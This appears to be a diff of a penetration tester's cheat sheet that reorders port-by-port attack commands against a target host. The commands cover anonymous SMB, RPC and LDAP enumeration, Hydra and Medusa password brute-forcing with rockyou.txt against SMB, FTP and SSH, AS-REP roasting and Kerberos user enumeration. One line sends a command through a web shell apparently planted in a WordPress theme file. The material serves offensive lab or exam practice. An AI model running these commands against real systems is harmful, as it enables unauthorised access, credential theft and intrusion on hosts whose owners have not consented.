@@ -1,3 +1,13 @@
+### Port 445 (SMB)
+smbclient -N -L //$rhost/ #445
+nmap --script smb-vuln* -p139,445 -Pn $rhost
+enum4linux-ng -AC $rhost #445
+nxc smb $rhost -u 'anonymous' -p '' --rid-brute #445
+nxc smb $rhost -u "" -p "" --users #445
+nxc smb $rhost -u "" -p "" --pass-pol #445
+impacket-lookupsid anonymous@$rhost #445
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost smb; exec zsh'" & disown
+
 ### Port 21 (FTP)
 ftp anonymous@$rhost #21
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp; exec zsh'" & disown
@@ -8,9 +18,30 @@ ftp anonymous@$rhost -P 2121 #2121
 nmap --script ftp* -p2121 -Pn $rhost #2121
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp -s 2121; exec zsh'" & disown
 
+### Port 135 (RPC)
+rpcclient -U "" $rhost -c "enumdomusers" #135
+rpcclient -U $shortdomain/$user $rhost #135
+rpcclient -U '' $rhost #135
+rpcclient -U "" $rhost #135
+rpcclient -U''%'' $rhost #135
+
 ### Port 22 (SSH)
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown
 medusa -u $user -P ~/rockyou.txt -h $rhost -M ssh #22
+
+### Port 389 (LDAP)
+jxplorer #389
+nmap -p389 --script "ldap* and not brute" -n -Pn $rhost #389
+Edit> ldapsearch -x -H "ldap://$rhost" -b "CN=$computer_name,DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
+Edit> ldapsearch -x -H "ldap://$rhost" -b "DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
+Edit> New tab plz nmap -p389 --script ldap-brute --script-args ldap.base='"cn=users,dc=$shortdomain,dc=c0mmm"' -Pn $rhost
+
+### Port 636 (LDAPS)
+# Note: No LDAPS commands were provided in the original list  #636
+
+### Port 88 (Kerberos)
+impacket-GetNPUsers -no-pass -usersfile users.txt $domain -dc-ip $rhost #88
+kerbrute userenum --domain $shortdomain users.txt --dc $rhost #88
 
 ### Port 25 (SMTP)
 smtp-user-enum -U /seclists/Usernames/Names/names.txt -t $rhost -m 150 #25
@@ -40,39 +71,8 @@ curl -s http://blog.$domain/wp-content/themes/twentynineteen/404.php?0=id #80
 cadaver http://$rhost/ITproject #80
 cadaver http://$rhost/maybe-it-cred-requires #80
 
-### Port 88 (Kerberos)
-impacket-GetNPUsers -no-pass -usersfile users.txt $domain -dc-ip $rhost #88
-kerbrute userenum --domain $shortdomain users.txt --dc $rhost #88
-
-### Port 135 (RPC)
-rpcclient -U "" $rhost -c "enumdomusers" #135
-rpcclient -U $shortdomain/$user $rhost #135
-rpcclient -U '' $rhost #135
-rpcclient -U "" $rhost #135
-rpcclient -U''%'' $rhost #135
-
-### Port 389 (LDAP)
-jxplorer #389
-nmap -p389 --script "ldap* and not brute" -n -Pn $rhost #389
-Edit> ldapsearch -x -H "ldap://$rhost" -b "CN=$computer_name,DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
-Edit> ldapsearch -x -H "ldap://$rhost" -b "DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
-Edit> New tab plz nmap -p389 --script ldap-brute --script-args ldap.base='"cn=users,dc=$shortdomain,dc=c0mmm"' -Pn $rhost
-
 ### Port 443 (HTTPS)
 wafw00f -v https://$domain #443
-
-### Port 445 (SMB)
-smbclient -N -L //$rhost/ #445
-nmap --script smb-vuln* -p139,445 -Pn $rhost
-enum4linux-ng -AC $rhost #445
-nxc smb $rhost -u 'anonymous' -p '' --rid-brute #445
-nxc smb $rhost -u "" -p "" --users #445
-nxc smb $rhost -u "" -p "" --pass-pol #445
-impacket-lookupsid anonymous@$rhost #445
-qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost smb; exec zsh'" & disown
-
-### Port 636 (LDAPS)
-# Note: No LDAPS commands were provided in the original list  #636
 
 ### Port 3306 (MySQL)
 mysql -u $user -h $rhost #3306 try with no password
